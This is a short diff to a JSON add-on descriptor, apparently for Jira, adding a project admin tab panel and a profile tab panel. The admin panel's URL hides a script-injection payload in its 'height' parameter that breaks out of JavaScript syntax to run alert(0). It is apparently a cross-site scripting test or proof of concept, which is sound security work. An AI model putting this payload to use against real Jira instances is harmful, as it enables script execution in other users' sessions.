@@ -102,6 +102,26 @@
             },
             "url": "/configure",
             "location": "system.admin/globalsettings"
-        }
+        },
+        "jiraProjectAdminTabPanels": [
+            {
+                "location": "projectgroup4",
+                "key": "project-admin-tab",
+                "url": "/hello-world?xox=test&width=&height=})},alert(0));x({k:x({x:{//",
+                "weight": 100,
+                "name": {
+                   "value": "Admin Panel"
+                }
+            }
+        ],
+        "jiraProfileTabPanels": [
+            {
+                "key": "profile-tab",
+                "url": "/profile-tab?profileUserKey={profileUser.key}&profileUserName={profileUser.name}",
+                "name": {
+                   "value": "Add-on Profile Tab"
+                }
+            }
+        ]
     }
 }
